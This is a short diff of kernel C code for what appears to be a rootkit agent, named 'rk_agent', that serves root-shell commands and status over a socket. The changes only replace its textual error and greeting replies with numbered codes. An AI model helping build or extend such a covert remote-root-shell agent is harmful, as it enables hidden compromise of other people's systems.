@@ -32,7 +32,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 			    const unsigned char *payload, size_t payload_length,
 			    bool *close_session)
 {
-	static const unsigned char error_reply[] = "ERR";
+	static const unsigned char error_reply[] = "ERR 6";
 	unsigned char reply[RK_FRAME_MAX];
 	struct rk_command command;
 	struct rk_root_shell_status shell_status;
@@ -69,9 +69,9 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		}
 		if (error == -EBUSY)
 			return rk_agent_reply(agent, socket,
-					      (const unsigned char *)"ERR busy", 8);
+					      (const unsigned char *)"ERR 4", 5);
 		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"ERR shell", 9);
+				      (const unsigned char *)"ERR 5", 5);
 	case RK_COMMAND_SHELL_STATUS:
 		rk_root_shell_snapshot(agent->shell, &shell_status);
 		reply_length = scnprintf(
@@ -91,7 +91,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 
 static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 {
-	static const unsigned char hello[] = "HELLO";
+	static const unsigned char hello[] = "HELLO 1";
 	u64 session;
 	int error;
 
